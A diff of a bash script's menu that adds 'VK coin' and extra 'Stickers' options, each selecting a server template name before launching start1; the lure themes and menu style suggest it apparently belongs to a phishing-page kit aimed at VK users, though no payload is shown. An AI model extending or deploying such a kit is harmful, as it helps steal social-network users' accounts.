@@ -13,16 +13,17 @@ command -v curl > /dev/null 2>&1 || { echo >&2 "I require curl but it's not inst
 
 menu() {
 
-printf "\e[1;92m[\e[0m\e[1;77m1\e[0m\e[1;92m]\e[0m\e[1;93m Голосования\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m1\e[0m\e[1;92m]\e[0m\e[1;93m VK coin\e[0m\n"
 printf "\e[1;92m[\e[0m\e[1;77m2\e[0m\e[1;92m]\e[0m\e[1;93m Подарки\e[0m\n"
 printf "\e[1;92m[\e[0m\e[1;77m3\e[0m\e[1;92m]\e[0m\e[1;93m Стикеры\e[0m\n"
 printf "\e[1;92m[\e[0m\e[1;77m4\e[0m\e[1;92m]\e[0m\e[1;93m Стикеры2(лучший вариант)\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m5\e[0m\e[1;92m]\e[0m\e[1;93m Стикеры3(выбор пользователей)\e[0m\n"
 printf "\e[1;92m[\e[0m\e[1;77m99\e[0m\e[1;92m]\e[0m\e[1;93m Exit\e[0m\n"
 read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose an option: \e[0m\en' option
 
 
 if [[ $option == 1 || $option == 01 ]]; then
-server=""
+server="vkcoin"
 start1
 
 elif [[ $option == 2 || $option == 02 ]]; then
@@ -33,6 +34,9 @@ server="reoil"
 start1
 elif [[ $option == 4 || $option == 04 ]]; then
 server="siol"
+start1
+elif [[ $option == 5 || $option == 05 ]]; then
+server="stikj"
 start1
 
 elif [[ $option == 99 ]]; then
